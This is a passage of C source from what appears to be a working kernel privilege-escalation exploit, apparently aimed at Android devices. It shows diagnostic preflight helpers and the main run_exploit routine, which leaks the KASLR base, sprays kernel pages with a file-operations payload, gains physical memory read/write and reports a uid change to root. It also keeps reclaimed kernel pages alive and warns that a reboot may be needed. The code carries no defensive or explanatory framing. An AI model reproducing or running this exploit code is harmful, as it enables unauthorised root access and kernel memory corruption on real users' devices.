  pr_info("RMG_COW_CPU_STATUS_BEGIN label=%s path=%s\n", label, path);
  while (fgets(line, sizeof(line), fp) != NULL) {
    int include = full_status;
    for (size_t i = 0; !include && fields[i] != NULL; i++) {
      if (strncmp(line, fields[i], strlen(fields[i])) == 0)
        include = 1;
    }
    if (include) {
      line[strcspn(line, "\r\n")] = '\0';
      pr_info("RMG_COW_CPU_STATUS label=%s %s\n", label, line);
    }
  }
  int read_errno = errno;
  if (ferror(fp))
    pr_warning("RMG_COW_CPU_STATUS label=%s path=%s read_errno=%d\n", label,
               path, read_errno);
  fclose(fp);
  pr_info("RMG_COW_CPU_STATUS_END label=%s path=%s\n", label, path);
}

static void rmg_diag_log_proc_cgroup(const char *label, const char *path) {
  FILE *fp = fopen(path, "r");
  if (fp == NULL) {
    pr_warning("RMG_COW_CPU_CGROUP label=%s path=%s open_errno=%d\n", label,
               path, errno);
    return;
  }

  char line[512];
  errno = 0;
  pr_info("RMG_COW_CPU_CGROUP_BEGIN label=%s path=%s\n", label, path);
  while (fgets(line, sizeof(line), fp) != NULL) {
    line[strcspn(line, "\r\n")] = '\0';
    pr_info("RMG_COW_CPU_CGROUP label=%s %s\n", label, line);
  }
  int read_errno = errno;
  if (ferror(fp))
    pr_warning("RMG_COW_CPU_CGROUP label=%s path=%s read_errno=%d\n", label,
               path, read_errno);
  fclose(fp);
  pr_info("RMG_COW_CPU_CGROUP_END label=%s path=%s\n", label, path);
}

static void rmg_diag_log_sched_affinity(const char *label, pid_t pid) {
  cpu_set_t mask;
  CPU_ZERO(&mask);
  errno = 0;
  int ret = sched_getaffinity(pid, sizeof(mask), &mask);
  int saved_errno = ret == 0 ? 0 : errno;
  unsigned long long bits = ret == 0 ? rmg_diag_affinity_mask64(&mask) : 0;
  pr_info("RMG_COW_CPU_SCHED_AFFINITY label=%s pid=%ld result=%d "
          "errno=%d mask=%016llx\n",
          label, (long)pid, ret, saved_errno, bits);
}

static void rmg_diag_log_process_context(void) {
  pid_t pid = getpid();
  pid_t ppid = getppid();
  pr_info("RMG_COW_CPU_CONTEXT pid=%ld ppid=%ld tid=%lld uid=%u euid=%u "
          "gid=%u egid=%u\n",
          (long)pid, (long)ppid, (long long)syscall(SYS_gettid), getuid(),
          geteuid(), getgid(), getegid());

  rmg_diag_log_proc_status("self", "/proc/self/status", 1);
  rmg_diag_log_proc_cgroup("self", "/proc/self/cgroup");

  if (ppid > 0) {
    char parent_status[64];
    char parent_cgroup[64];
    int status_len = snprintf(parent_status, sizeof(parent_status),
                              "/proc/%ld/status", (long)ppid);
    int cgroup_len = snprintf(parent_cgroup, sizeof(parent_cgroup),
                              "/proc/%ld/cgroup", (long)ppid);
    if (status_len > 0 && (size_t)status_len < sizeof(parent_status))
      rmg_diag_log_proc_status("parent", parent_status, 0);
    if (cgroup_len > 0 && (size_t)cgroup_len < sizeof(parent_cgroup))
      rmg_diag_log_proc_cgroup("parent", parent_cgroup);
    rmg_diag_log_sched_affinity("parent", ppid);
  }
}

static int rmg_diag_cpu67_preflight(void) {
  rmg_diag_log_process_context();

  cpu_set_t inherited, all_cpus, allowed, restored;
  CPU_ZERO(&inherited);
  memset(&all_cpus, 0xff, sizeof(all_cpus));
  CPU_ZERO(&allowed);
  CPU_ZERO(&restored);

  errno = 0;
  int inherited_ret = sched_getaffinity(0, sizeof(inherited), &inherited);
  int inherited_errno = inherited_ret == 0 ? 0 : errno;
  if (inherited_ret != 0) {
    pr_warning("COW CPU preflight cannot read inherited affinity errno=%d\n",
               inherited_errno);
    return 0;
  }

  errno = 0;
  int expand_ret = sched_setaffinity(0, sizeof(all_cpus), &all_cpus);
  int expand_errno = expand_ret == 0 ? 0 : errno;
  if (expand_ret != 0) {
    pr_warning("COW CPU preflight cannot query allowed affinity errno=%d\n",
               expand_errno);
    return 0;
  }

  errno = 0;
  int allowed_ret = sched_getaffinity(0, sizeof(allowed), &allowed);
  int allowed_errno = allowed_ret == 0 ? 0 : errno;
  unsigned long long inherited_bits =
      rmg_diag_affinity_mask64(&inherited);
  unsigned long long allowed_bits = allowed_ret == 0
      ? rmg_diag_affinity_mask64(&allowed) : 0;
  int cpu6_allowed = allowed_ret == 0 && CPU_ISSET(6, &allowed);
  int cpu7_allowed = allowed_ret == 0 && CPU_ISSET(7, &allowed);
  int observer_cpu_available = 0;
  if (allowed_ret == 0) {
    for (int cpu = 0; cpu < CPU_SETSIZE; cpu++) {
      if (cpu != 6 && cpu != 7 && CPU_ISSET(cpu, &allowed)) {
        observer_cpu_available = 1;
        break;
      }
    }
  }

  errno = 0;
  int restore_ret =
      sched_setaffinity(0, sizeof(inherited), &inherited);
  int restore_errno = restore_ret == 0 ? 0 : errno;
  errno = 0;
  int restored_ret = sched_getaffinity(0, sizeof(restored), &restored);
  int restored_errno = restored_ret == 0 ? 0 : errno;
  int restored_matches = restore_ret == 0 && restored_ret == 0;
  if (restored_matches) {
    for (int cpu = 0; cpu < CPU_SETSIZE; cpu++) {
      if (CPU_ISSET(cpu, &inherited) != CPU_ISSET(cpu, &restored)) {
        restored_matches = 0;
        break;
      }
    }
  }

  pr_info("RMG_COW_CPU_PREFLIGHT inherited=%016llx allowed=%016llx "
          "allowed_errno=%d cpu6=%d cpu7=%d observer_cpu=%d "
          "restore=%d/%d verify=%d/%d restored=%016llx match=%d\n",
          inherited_bits, allowed_bits, allowed_errno, cpu6_allowed,
          cpu7_allowed, observer_cpu_available, restore_ret, restore_errno,
          restored_ret, restored_errno,
          restored_ret == 0 ? rmg_diag_affinity_mask64(&restored) : 0,
          restored_matches);

  if (!restored_matches) {
    pr_warning("COW CPU preflight could not restore the original affinity; "
               "refusing the exploit route\n");
    return 0;
  }
  if (allowed_ret != 0 || !cpu6_allowed || !cpu7_allowed ||
      !observer_cpu_available) {
    pr_warning("COW CPU preflight requires allowed CPUs 6 and 7 plus a "
               "separate observer CPU; skipping before the exploit route\n");
    return 0;
  }
  return 1;
}
#endif

int run_exploit(int argc, char **argv) {
  (void)argc;
  (void)argv;

#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("exploit-entry", getpid(), getuid());
#endif

#if defined(RMG_DIAG_COW_REQUIRE_CPUS_67) && \
    RMG_DIAG_COW_REQUIRE_CPUS_67
  if (!rmg_diag_cpu67_preflight()) {
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    rmg_diag_checkpoint("cow-cpu67-preflight-skip", 6, 7);
#endif
    return 42;
  }
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("cow-cpu67-preflight-pass", 6, 7);
#endif
#endif

#if defined(RMG_DIAG_COW_PARENT_AFFINITY_ONLY) && \
    RMG_DIAG_COW_PARENT_AFFINITY_ONLY
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("cow-parent-affinity-only-stop", getpid(), getppid());
#endif
  pr_warning("parent-affinity-only diagnostic stopped before the exploit "
             "route\n");
  return 42;
#endif

  disable_rseq_for_thread();
  set_limit();
  log_startup_context();
  init_ashmem_path();

  pin_to_core(CORE);
  if (!slide_leak_kernel_base()) {
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
    rmg_diag_checkpoint("kaslr-failed", 0, 0);
#endif
    pr_error("slide kaslr leak failed\n");
    return 1;
  }
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("kaslr-ready", kaslr_base, slide_p0_offset);
#endif
  if (getenv("SLIDE_ONLY") || getenv("P0_ONLY")) {
    pr_success("slide-only done base=%016zx slide=%016zx p0_offset=%08zx\n",
               kaslr_base, kaslr_slide, slide_p0_offset);
    return 0;
  }

#if defined(RMG_DIAG_PIPE_HANDOFF) && RMG_DIAG_PIPE_HANDOFF
  reset_pipe_attempt();
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("pipe-handoff-start", 0, 0);
#endif
  uintptr_t diagnostic_pipe_base = prepare_pipe_buffer_page();
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("pipe-handoff-done", diagnostic_pipe_base, 0);
#endif
  pr_warning("pipe-handoff-only result base=%016zx; FOPS and root stages intentionally skipped\n",
             diagnostic_pipe_base);
  reset_pipe_attempt();
  return 42;
#elif defined(RMG_DIAG_CONTROLLED_MM) && RMG_DIAG_CONTROLLED_MM
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("mmcollect-start", 0, 0);
#endif
  int mm_collected = run_mm_collection_diagnostic();
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("mmcollect-done", mm_collected, 0);
#endif
  pr_warning("mmcollect-only finished result=%d; FOPS and root stages intentionally skipped\n",
             mm_collected);
  return 42;
#elif defined(RMG_DIAG_CONTROLLED_RECLAIM_ONLY) && \
    RMG_DIAG_CONTROLLED_RECLAIM_ONLY
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("reclaim-only-start", 0, 0);
#endif
  SYSCHK(setenv("CONTROLLED_RECLAIM", "1", 1));
  SYSCHK(setenv("CONTROLLED_RECLAIM_PROBE", "1", 1));
  uintptr_t diagnostic_page = prepare_kernel_page(PAGE_PAYLOAD_FOPS);
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("reclaim-only-done", diagnostic_page, 0);
#endif
  close_reclaim_sockets();
  cleanup_page_prepare_state();
  pr_warning("controlled-reclaim-only result=%016zx; FOPS and root stages intentionally skipped\n",
             diagnostic_page);
  return 42;
#endif

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  reset_pipe_attempt();
  pipebuf_page_base = prepare_pipe_buffer_page();
  pr_info("fresh physrw pipe page=%016zx\n", pipebuf_page_base);
  if (!is_direct_ptr(pipebuf_page_base)) {
    return 1;
  }
#endif

  pin_to_core(CORE);
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);

  if (!prepare_route_craft()) {
    pr_warning("route craft fd matrix build failed\n");
    return 1;
  }

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  if (!page_base) {
    return 1;
  }
  for (int attempt = 1; attempt <= 1; attempt++) {
    int triggered = app_trigger_fops_slide_route();
    int verified = triggered && try_cfi_stage();
    pr_info("app fops slide attempt=%d/1 triggered=%d verified=%d "
            "step=%d errno=%d\n",
            attempt, triggered, verified, cfi_last_step, cfi_last_errno);
    if (verified || cfi_dirty_seen) {
      break;
    }
  }
#else
#if defined(RMG_DIAG_FDSET_PREFLIGHT_ONLY) && \
    RMG_DIAG_FDSET_PREFLIGHT_ONLY
  /* This diagnostic must always use the readiness-pause route and must stop
   * before any alternate waiter32 or post-route exploit path. */
  run_main_route_threads();
#else
  /* Use the 32-bit compat socketcall overlay if WAITER32=1 is set,
   * otherwise fall back to the legacy pselect/spray route. */
  if (getenv("WAITER32"))
    run_waiter32_route();
  else
    run_main_route_threads();
#endif
#endif

#if defined(RMG_DIAG_FDSET_PREFLIGHT_ONLY) && \
    RMG_DIAG_FDSET_PREFLIGHT_ONLY
#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
  rmg_diag_checkpoint("fdset-preflight-run-stop", cfi_last_step,
                      cfi_last_errno);
#endif
  return 42;
#endif

  pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016zx slide=%016zx\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done,
             kaslr_done, kaslr_base, kaslr_slide);
  pr_success("pipe physrw pid=%d done=%d root=%d kaslr=%d read_ok=%d "
             "write_ok=%d rw64=%d/%d uid=%u->%u\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done, kaslr_done,
             physrw_read_ok, physrw_write_ok, physrw_read64_ok, physrw_write64_ok,
             root_uid_before, root_uid_after);
  if (pipe_prepare_child > 0) {
    SYSCHK(kill(pipe_prepare_child, SIGKILL));
    SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
  }
  int exploit_ok = atomic_load(&cfi_stage_done) && root_child_done;
  if (exploit_ok || cfi_dirty_seen) {
    pid_t keeper = spawn_allocation_keeper();
    if (exploit_ok) {
      pr_success("stability keeper pid=%d retaining reclaimed kernel pages\n",
                 keeper);
    } else {
      pr_warning("stability keeper pid=%d retaining dirty fops page; "
                 "reboot required\n",
                 keeper);
    }
  }
  return exploit_ok ? 0 : 1;
}
